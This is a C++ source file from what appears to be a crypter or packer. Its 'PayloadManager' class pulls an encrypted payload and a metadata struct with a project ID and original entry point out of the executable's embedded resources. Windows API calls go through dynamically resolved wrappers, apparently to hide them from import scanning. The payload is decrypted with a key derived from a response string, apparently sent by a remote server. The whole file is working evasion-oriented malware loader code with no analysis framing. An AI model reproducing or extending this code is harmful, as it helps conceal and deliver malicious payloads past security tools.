#include "pch.h"

#include "resource.h"
#include "PayloadManager.hpp"
#include "Cryptography.hpp"

PayloadManager::PayloadManager() {
    this->rawData = this->LoadRawData();
    this->mappedData = LoadAdditionalData();
}

PayloadManager::~PayloadManager() {
    delete this->rawData;
	delete this->mappedData;
}

vector<BYTE>* PayloadManager::LoadRawData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = dImp->dFindResourceA(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN1), "P_BIN");

    if (!hResource) {
        return nullptr;
    }

    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return nullptr;
    }

    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);

    if (!pLockedResource) {
        return nullptr;
    }

    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return nullptr;
    }

    vector<BYTE>* data = new vector<BYTE>(plusaes::get_padded_encrypted_size(dwResourceSize));
    memcpy(&data->data()[0], pLockedResource, dwResourceSize);

    return data;
}

Payload* PayloadManager::LoadAdditionalData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = dImp->dFindResourceA(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN2), "P_BIN");

    if (!hResource) {
        return nullptr;
    }

    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return nullptr;
    }

    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);

    if (!pLockedResource) {
        return nullptr;
    }

    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return nullptr;
    }

    Payload* data = new Payload();
    memcpy(data, pLockedResource, dwResourceSize);

    return data;
}

char* PayloadManager::GetProjectId() {
    return this->mappedData->projectId;
}

vector<BYTE>* PayloadManager::GetDecryptedPayload(string response) {
    DecryptKey key = Cryptography::GetKeyFromResponse(response);
    Cryptography c(key);

    vector<BYTE>* decrypted = c.Decrypt(this->rawData);

    return decrypted;
}

DWORD PayloadManager::GetOEP() {
	return this->mappedData->OEP;
}